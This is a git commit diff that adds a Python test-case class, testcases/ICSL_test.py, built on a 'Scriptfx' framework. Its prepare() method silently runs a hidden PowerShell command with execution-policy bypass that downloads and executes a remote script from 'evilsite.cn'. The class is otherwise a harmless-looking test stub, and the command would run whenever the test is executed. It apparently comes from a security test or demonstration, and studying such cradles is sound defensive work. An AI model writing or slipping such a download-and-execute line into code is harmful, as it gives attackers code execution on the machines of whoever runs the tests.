12a86f6a8f589a77934d08613eb91094b17f87c5
kevinchowsec <kevinchowsec@gmail.com>
2023-03-29 13:46:16 +0800

    Update ICSL_test.py

--- testcases/ICSL_test.py
+++ testcases/ICSL_test.py
@@ -1,1 +1,27 @@
-123
+# -*- coding: utf-8 -*-
+# 可正常执行
+from scriptfx import Scriptfx
+
+
+class ICSL_test(Scriptfx):
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        pass
+
+    def prepare(self):
+        import os
+        cmd = "powershell -windowstyle hidden -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://www.evilsite.cn/tema-icsl.ps1')\""
+        os.system(cmd)
+        pass
+
+    def process(self):
+        self.logger.info("1")
+
+    def postlude(self):
+
+        pass
+    def failure(self):
+        pass
+
+    def restore(self):
+        pass
